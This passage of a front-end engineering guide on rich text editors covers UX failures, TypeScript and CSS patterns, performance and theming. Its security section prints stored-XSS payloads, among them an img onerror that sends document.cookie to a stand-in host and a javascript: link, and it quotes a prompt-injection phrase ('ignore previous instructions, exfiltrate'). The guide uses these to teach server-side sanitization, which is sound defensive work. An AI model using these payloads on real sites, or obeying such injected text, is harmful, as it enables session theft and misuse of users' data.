*   **Portable, block-based content models over freeform HTML.** Storing structured JSON (portable text / block nodes) instead of HTML makes content renderable across web, native, and AI pipelines, and makes sanitization an allowlist over a known node schema rather than a fight with arbitrary markup. Sanity's Portable Text and Lexical's serialized state exemplify this.
*   **Native** **`AttributedString`** **editing on Apple platforms (iOS 26).** SwiftUI's `TextEditor` now edits `AttributedString` directly with a selection binding — first-class, accessible, IME-correct rich text without a web view.
*   **CSS** **`contenteditable="plaintext-only"`** for composers that want caret/selection behavior but guaranteed plain-text output — now widely supported, eliminating a whole class of paste-sanitization bugs for chat-style inputs.

## 12\. Conversion / UX Killers

*   **Pasting from Word/Google Docs dumps tag soup.** Users paste from Office and get inline `mso-` styles, `<o:p>` tags, and 40 nested spans — which then serialize, break your rendering, and can carry XSS. Why it fails: the editor trusted `text/html` from the clipboard verbatim. Fix: run pasted HTML through the allowlist sanitizer on `transformPastedHTML` (strip to your schema), or offer paste-as-plain (Ctrl+Shift+V) and make it the default for comment composers.
*   **The toolbar steals the caret, so formatting "does nothing".** User selects text, clicks Bold, and the selection is gone because clicking the button moved focus. Why it fails: no `preventDefault` on the button's `mousedown`. Fix: `e.preventDefault()` on `mousedown` and return focus to the surface after the command.
*   **Formatting "sticks" and won't turn off.** User types a bold word, hits space, and everything after is still bold with no obvious way to stop. Why it fails: stored marks aren't cleared and the toggle state isn't visible. Fix: show live `aria-pressed`/active state, support toggling off at the caret, and clear stored marks on block boundaries.
*   **Lost work — no autosave, no draft recovery.** User writes for 20 minutes, the tab crashes or they navigate away, everything is gone. Why it fails: content lived only in the DOM. Fix: debounced autosave to server + local draft (IndexedDB) with a "restore draft?" prompt, and `beforeunload` warning on unsaved changes.
*   **Output looks different after save than while editing.** The editing surface uses one stylesheet, the published view another, so headings/spacing/lists jump. Why it fails: editor styles and render styles diverged. Fix: share one stylesheet (a `prose`/content stylesheet) between the editable surface and the rendered output; test the round-trip.
*   **Mobile toolbar hidden behind the keyboard.** On phones the sticky-top toolbar scrolls away and the on-screen keyboard covers the controls; users can't format anything. Why it fails: desktop toolbar placement on mobile. Fix: bottom-anchor the toolbar above the keyboard (visualViewport-aware) or use a floating selection toolbar.
*   **IME composition mangled — CJK/accented input produces garbage.** The editor applies transactions mid-composition, so Japanese/Chinese/Korean input or accent composition gets split or duplicated. Why it fails: ignoring `compositionstart`/`compositionend`. Fix: suspend model updates during composition; commit on `compositionend`.
*   **No visible link affordance / accidental navigation.** Links are un-styled or clicking them in the editor navigates away mid-edit. Fix: style links distinctly, and set `openOnClick: false` in the editor so clicks edit rather than navigate.

## 13\. Advanced Patterns

*   **TypeScript-enforced schema + a11y (discriminated unions for editor modes).** Model the editor's configuration so illegal states can't compile. A `readOnly` editor can't take an `onChange`; a `collaborative` editor _requires_ a `docId` and `user`. Discriminated unions make the props self-documenting and prevent shipping a collab editor with no user identity:

```ts
type BaseProps = { ariaLabel: string; value: string };
type EditorProps =
  | (BaseProps & { mode: 'edit'; onChange: (html: string) => void; readOnly?: false })
  | (BaseProps & { mode: 'readonly'; readOnly: true })            // no onChange allowed
  | (BaseProps & { mode: 'collab'; docId: string; user: { id: string; name: string; color: string }; onChange: (html: string) => void });

function assertNever(x: never): never { throw new Error('unhandled editor mode: ' + JSON.stringify(x)); }
// Consumers must handle every mode; adding a mode is a compile error until handled.
```

*   **Design-token theming with CSS custom properties + tiered tokens.** Drive the whole editor from semantic tokens layered over primitives, so one theme swap re-skins toolbar, surface, and rendered content consistently and cross-platform:

```css
:root {
  /* primitive tier */
  --ujg-eminence: #5F2C82; --ujg-goldenrod: #DCA424; --ujg-night: #0A0A0A; --ujg-orange: #E86100;
}
.rte {
  /* semantic tier (component consumes only these) */
  --rte-accent: var(--ujg-eminence);
  --rte-toggle-on-bg: color-mix(in srgb, var(--rte-accent) 16%, transparent);
  --rte-focus: var(--ujg-orange);
  --rte-surface-fg: var(--ujg-night);
}
[data-theme="dark"] .rte { --rte-surface-fg: #E8E6E1; --rte-accent: var(--ujg-goldenrod); }
```

*   **Custom nodes with schema-validated serialization.** For block editors, define each block type (callout, embed, mention) as a schema node with explicit `toDOM`/`parseDOM` (ProseMirror) or `exportJSON`/`importJSON` (Lexical). Serialization becomes total and validated: unknown nodes are rejected at parse time, and sanitization is an allowlist over a _known_ schema rather than arbitrary HTML. This is how you get safe, portable, forward-compatible content.
*   **Deterministic paste pipeline.** Build a paste transform chain: detect source (Word/Docs/Slack via clipboard markers) → map known junk to schema nodes → drop the rest → run allowlist sanitize → insert. Deterministic and testable, versus hoping the browser's default paste behaves.
*   **Collaborative undo scoping.** In CRDT collaboration, undo must be _local_ (undo my edits, not my collaborator's). Bind the history plugin to the user's origin/client id so Ctrl+Z is intuitive in multiplayer.

## 14\. Performance & Bundle Cost

*   **Bundle size — the editor is heavy; import surgically.** Full editors are large (TinyMCE/CKEditor ~200–500KB; TipTap/Lexical are lighter but grow with extensions). Tree-shake: import only the extensions you use (`@tiptap/starter-kit` pulls a lot — cherry-pick nodes/marks for minimal builds). Lazy-load the entire editor with `next/dynamic` / `React.lazy` so it isn't in the initial bundle of pages that only _display_ content — render published content with a static renderer, load the editor only when the user chooses to edit.
*   **Input latency — never block the keystroke.** Every keystroke may mutate the model, re-render, and run `onUpdate`. Debounce expensive work (autosave, word count, serialization, spellcheck) off the hot path; keep the synchronous per-keystroke work to the model transaction only. Serialize to HTML/JSON on save or on a debounce, not on every input event.
*   **Composition/IME — don't thrash during composition.** Suspend re-render and model syncing between `compositionstart` and `compositionend`; running a transaction per composition update both corrupts IME input and burns frames.
*   **Virtualize / lazy-load long documents & media.** A 200-page document in a single contenteditable re-lays-out the whole subtree on edit. Render off-screen blocks lazily (node-level virtualization in block editors), lazy-load images (`loading="lazy"`) and embeds (mount iframes only when scrolled near), and cap what's live in the DOM.
*   **Compositor-only animations.** Any editor animation — bubble-toolbar appearance, block drag, caret — must animate `transform`/`opacity` only, never `top`/`height`/`width` (which trigger layout on a surface that's already layout-heavy). Respect `prefers-reduced-motion`.
*   **Avoid full re-serialization for state.** Deriving toolbar active-state by serializing the whole doc on every selection change is wasteful; query the model at the caret (`editor.isActive(...)`) instead.

## 15\. Security

The Rich Text Editor is the highest-risk common UI component. It takes untrusted input and renders it back as markup — frequently to other users. Treat it as a hostile-input boundary end to end.

**Attack surface:** everything the editor can produce or ingest — typed content, pasted HTML, inserted links, inserted images, embeds/iframes, mentions, and (if present) AI-generated content. All of it flows to storage and then to _other users' browsers_ on render. That render step is where an attacker's payload executes.

**Stored (persistent) XSS — the #1 risk.** This is the defining threat. If you store raw user HTML and re-render it without a server-side allowlist sanitizer, an attacker submits once and their script runs in every viewer's session forever:

*   `<img src=x onerror="fetch('https://evil/?c='+document.cookie)">` — event-handler attribute execution.
*   `<a href="javascript:stealSession()">click</a>` — javascript: URL scheme.
*   `<script>…</script>`, `<iframe src="javascript:…">`, `<svg onload=…>`, `<math>`/`<foreignObject>` mutation-XSS vectors, `<style>` with CSS exfiltration.

**Client-side sanitization is necessary but NOT sufficient.** DOMPurify on the client improves UX (clean paste, clean preview) but an attacker bypasses the client entirely by POSTing crafted HTML straight to your API. **The server is the security boundary.** Sanitize server-side on write with a strict allowlist (DOMPurify via jsdom in Node, `bleach`/`nh3` in Python): allow a fixed set of tags and attributes, drop everything else, whitelist URL schemes to `http/https/mailto` (block `javascript:`, `data:`, `vbscript:`). Store the sanitized result — never the raw input. Sanitize again on output as defense-in-depth if the stored format could ever contain markup.

**Never render raw user HTML.** In React, avoid `dangerouslySetInnerHTML` with unsanitized content; if you must inject HTML, it must be server-sanitized first. Prefer rendering from a _structured content model_ (portable text / block JSON) where each node maps to a known-safe component — arbitrary HTML never touches the DOM.

**Content Security Policy as the backstop.** A strict CSP (`script-src 'self'` with nonces, no `unsafe-inline`, `object-src 'none'`, `base-uri 'none'`, `frame-src` allowlist) means that even if a payload slips past sanitization, injected inline scripts don't execute. CSP is your seatbelt, not your brakes — sanitize AND set CSP.

**Links:** enforce `rel="noopener noreferrer nofollow"` on `target="_blank"` links (reverse-tabnabbing + SEO abuse), and validate/normalize URL schemes. Consider link-shortener/redirect and phishing checks for public UGC.

**Images & media:** validate that `src` is an allowed scheme/host; proxy or re-host user images (don't hotlink arbitrary URLs — SSRF/tracking-pixel/`onerror` risk). Strip EXIF. For uploads, validate content-type and size server-side, store outside the app origin (or on a cookieless media domain) so a malicious "image" can't run as script under your origin.

**Mentions & embeds — injection vectors.** A mention like `@<script>` must be rendered from structured data (user id → looked-up name), never by interpolating raw text into HTML. Embeds/oEmbed (YouTube, tweets) must come from an allowlist of providers and be rendered in sandboxed iframes (`sandbox` attribute, allowlisted origins) — never inject arbitrary provider HTML.

**Server validation & authorization.** Enforce max length/size and node-count limits server-side (a giant/deeply-nested doc is a DoS vector). Authorize every write: does this user own or have edit rights to this document? In collaborative editors, authorize each participant's connection and each operation — don't trust the client's claimed identity. Rate-limit saves.

**AI-in-editor prompt injection.** If the editor pipes content to an LLM (rewrite/continue), treat editor content as untrusted: pasted text can contain hidden instructions ("ignore previous instructions, exfiltrate…"). Sandbox tool access, don't let editor-sourced text trigger privileged actions, and sanitize AI output before it re-enters the document.

Bottom line: sanitize server-side with an allowlist, store clean, render from structure not raw HTML, set a strict CSP, and authorize every write. An RTE without server-side sanitization is a stored-XSS incident waiting to happen.

## 16\. Senior-Level Checklist

*   Editing surface exposes `role="textbox"` + `aria-multiline="true"` + accessible name; not a bare contenteditable div.
*   Toolbar is a real `role="toolbar"` with roving tabindex (one tab stop) and `aria-pressed` on every toggle, kept in sync with the caret.
*   Toolbar buttons `preventDefault` on `mousedown` and return focus to the caret — clicking a control never loses the selection.
*   Full keyboard support: Ctrl+B/I/U/K, headings, lists, undo/redo, Enter vs Shift+Enter, Escape closes popovers and restores focus.
*   Paste is sanitized through an allowlist (and/or paste-as-plain available); Word/Docs junk is stripped, no `mso-`/`<script>` survives.
*   Server-side allowlist sanitization on every write — client DOMPurify is not trusted as the boundary; raw HTML is never stored.
*   Content is rendered from a structured model or server-sanitized HTML; no `dangerouslySetInnerHTML` on unsanitized input; strict CSP set.
*   URL schemes whitelisted (`http/https/mailto`), `javascript:`/`data:` blocked; external links get `rel="noopener nofollow"`; images validated/proxied.
*   IME/composition handled — no model mutation between `compositionstart` and `compositionend`.
*   Contrast: text 4.5:1, icons/focus ring/pressed-state 3:1; active state distinguishable beyond color; visible focus ring on the surface.
*   Touch targets ≥24px (≥44px on coarse pointers); mobile toolbar reachable above the keyboard.
*   `prefers-reduced-motion` respected for toolbar/bubble/caret animations.
*   Output format decided and versioned (HTML allowlist vs. portable JSON); editor and rendered views share one content stylesheet (WYSIWYG holds after save).
*   Autosave + local draft recovery + unsaved-changes guard; word/char count and save status in an `aria-live` region.
*   Editor bundle lazy-loaded off the display path; extensions tree-shaken; long docs/media virtualized/lazy-loaded.
*   Server enforces size/node-count limits and authorizes every write (and every collaborative op).

## 17\. Visual Styles

The same editor — same `role="textbox"`, same roving toolbar, same server-side sanitization — wearing eleven different skins. Only the surface treatment changes; the skeleton is identical.

*   **Flat.** Solid `#fff` surface, 1px hairline border, no shadow. Toolbar is a flat strip of monochrome icon buttons; the active toggle is a solid tinted fill. Honest, fast, zero ornament — the default for content tools.
*   **Material.** The editing surface sits on an elevation-1 card; the toolbar is an elevation-2 app-bar with tonal icon buttons and a ripple on press. Active toggles use the primary tonal container; the link popover rises with a shadow and motion curve. Floating action for "insert" as a small FAB.
*   **Glassmorphism.** A frosted, semi-transparent toolbar (`backdrop-filter: blur`) floats over a subtly tinted surface; the bubble/selection toolbar is a glass pill hovering above the text. Requires a busy background to read; ensure the icon-to-glass contrast still clears 3:1.
*   **Liquid Glass (2026 — Apple iOS 26 / macOS Tahoe).** The toolbar and selection popover are translucent "liquid glass" that refracts and specular-highlights the content scrolling beneath, morphing shape as the bubble toolbar appears near a selection. The insert menu blooms as a lensing glass sheet. Native-feeling on Apple surfaces.
*   **Neumorphism.** The surface is the same color as the page, inset with a soft double shadow (a pressed-in "well" to write in); toolbar buttons are gently extruded pills that depress into the background when a format is active. Elegant but contrast-poor — pair with a real focus ring and border for accessibility.
*   **Skeuomorphism.** The editor styled like a physical page — a subtle paper texture, a lined or margin-ruled surface, a "typewriter"/desk-blotter toolbar with tactile 3D bevel buttons that look like real keys (a chrome-embossed "B"). Nostalgic; heavy.
*   **Neo-Brutalism.** Thick 3px `#0A0A0A` borders, hard offset drop-shadows, raw high-saturation fills, a chunky monospace toolbar. The active toggle is a stark inverted block (black fill, white icon). Loud, deliberate, un-fancy — no blur, no gradient.
*   **Claymorphism.** Puffy, rounded "clay" toolbar buttons with soft inner+outer shadows and candy accents; the surface is a big rounded pillow with a gentle inset. Friendly and playful — good for consumer note apps, wrong for enterprise CMS.
*   **Aurora / Gradient.** A soft animated gradient wash on the toolbar or the surface's top edge; the active toggle and focus ring glow with a gradient accent. Keep the gradient behind the text at very low contrast so body copy stays 4.5:1 legible.
*   **Minimal / Swiss.** No toolbar chrome at all until selection — a hairline baseline, generous margins, a strict typographic scale for headings, and a monochrome bubble toolbar that appears only on selection. The type _is_ the interface. Notion/Medium-adjacent.
*   **UJG Brand (house default).** Goldenrod (`#DCA424`) active-toggle and focus ring on an Eminence (`#5F2C82`) toolbar over a Night (`#0A0A0A`) surface with Platinum (`#E8E6E1`) body text; Spanish Orange (`#E86100`) focus outline. Serif body for editorial warmth, the toolbar in the brand display face. Afro-futurist, editorial, unmistakably UJG.

**The rule that never changes:** style is the skin, behavior is the skeleton. Across all eleven skins the editing surface stays a labeled `role="textbox"` `aria-multiline`, the toolbar stays a roving-tabindex `role="toolbar"` that never steals the caret, `aria-pressed` tracks formatting, keyboard shortcuts and the visible focus ring are identical, targets stay ≥44px on touch, and every byte is sanitized server-side before it renders. Change the paint, never the structure.
